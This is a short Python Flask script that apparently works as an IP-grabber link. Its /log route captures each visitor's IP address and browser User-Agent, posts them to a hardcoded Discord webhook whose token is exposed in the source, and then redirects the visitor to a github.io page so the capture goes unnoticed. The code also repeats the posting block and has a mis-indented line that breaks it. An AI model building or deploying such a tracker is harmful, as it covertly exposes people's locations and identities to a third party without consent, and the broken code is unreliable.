from flask import Flask, request , redirect
from werkzeug.middleware.proxy_fix import ProxyFix
import requests
import os
import time

app = Flask(__name__)

# Render-Proxy berücksichtigen
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)

WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0zdVMZLN5A9utw1oWapMWx0MLIKXYYKv551KmndGOKbITTiKO-Hc57evMT"

@app.route('/log')
def log_ip():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    data = {
        "content": f"IP: {ip}\nUser-Agent: {user_agent}"
    }
    requests.post(WEBHOOK_URL, json=data)
  

    user_agent = request.headers.get("User-Agent")

    requests.post(WEBHOOK_URL, json={
        "content": f"IP: {ip}\nUser-Agent: {user_agent}"
    })

  time.sleep(5)
    return redirect("https://gengaog.github.io/-/") 

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
